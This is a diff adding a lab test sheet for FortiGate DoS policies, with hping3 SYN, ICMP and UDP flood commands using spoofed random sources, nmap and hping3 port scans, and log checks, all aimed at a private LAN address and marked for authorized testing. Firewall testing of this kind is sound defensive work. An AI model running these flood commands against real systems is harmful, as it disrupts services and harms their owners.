@@ -1,0 +1,103 @@
+################################################################################
+#                       DoS ATTACK TEST COMMANDS                               #
+#                 For use with FortiGate DoS Policy Testing                    #
+#                 Execute from Kali Linux VM on LAN segment                    #
+#                                                                              #
+#  ⚠️  WARNING: These commands are for authorized lab/testing use ONLY.        #
+#  ⚠️  Never execute against systems you do not own or have permission to test. #
+################################################################################
+
+# ============================================================================
+# PREREQUISITE: Install hping3 on Kali Linux
+# ============================================================================
+
+sudo apt-get update
+sudo apt-get install -y hping3
+
+# ============================================================================
+# TEST 1: TCP SYN Flood (Primary DoS Test)
+# ============================================================================
+# Triggers: tcp_syn_flood anomaly (threshold: 2000 pps)
+# Target: FortiGate LAN host
+# ============================================================================
+
+sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.205.2
+
+# Parameter breakdown:
+#   -c 15000        : Send 15,000 total packets
+#   -d 120          : 120 bytes data payload
+#   -S              : Set SYN flag only
+#   -w 64           : TCP window size = 64
+#   -p 80           : Target destination port 80 (HTTP)
+#   --flood         : Maximum speed flood (no delays)
+#   --rand-source   : Randomize source IP (spoofing)
+#   192.168.205.2   : Target IP on LAN segment
+
+# Expected result:
+#   X packets transmitted, 0 packets received, 100% packet loss
+#   (FortiGate DoS policy blocks all SYN flood packets)
+
+# ============================================================================
+# TEST 2: ICMP Flood Test
+# ============================================================================
+# Triggers: icmp_flood anomaly (threshold: 250 pps)
+# ============================================================================
+
+sudo hping3 --icmp -c 5000 --flood 192.168.205.2
+
+# ============================================================================
+# TEST 3: UDP Flood Test
+# ============================================================================
+# Triggers: udp_flood anomaly (threshold: 2000 pps)
+# ============================================================================
+
+sudo hping3 --udp -c 10000 -p 53 --flood --rand-source 192.168.205.2
+
+# ============================================================================
+# TEST 4: TCP Port Scan Simulation
+# ============================================================================
+# Triggers: tcp_port_scan anomaly (threshold: 1000 pps)
+# ============================================================================
+
+# Using nmap for port scan simulation
+sudo nmap -sS --min-rate 2000 192.168.205.2
+
+# Alternative using hping3
+sudo hping3 -S --scan 1-1000 192.168.205.2
+
+# ============================================================================
+# TEST 5: Verify FortiGate is Blocking (Baseline Ping Test)
+# ============================================================================
+
+# Before attack — confirm target is reachable
+ping -c 4 192.168.205.2
+
+# During flood — in separate terminal, confirm service degradation
+ping -c 10 192.168.205.2
+
+# After attack stops — confirm target recovers
+ping -c 4 192.168.205.2
+
+# ============================================================================
+# MONITORING: Check FortiGate Logs After Testing
+# ============================================================================
+
+# On FortiGate CLI — check anomaly counters
+diagnose ips anomaly list
+
+# On FortiGate GUI:
+#   Log & Report → Security Events → Summary
+#   Look for "Anomaly" section with triggered events
+
+# Expected FortiGate Log Entry:
+#   Type: Attack
+#   Subtype: anomaly
+#   Attack Name: tcp_syn_flood
+#   Action: dropped
+#   Source IP: [randomized]
+#   Destination IP: 192.168.205.2
+#   Destination Port: 80
+
+################################################################################
+# END OF DoS TEST COMMANDS
+################################################################################
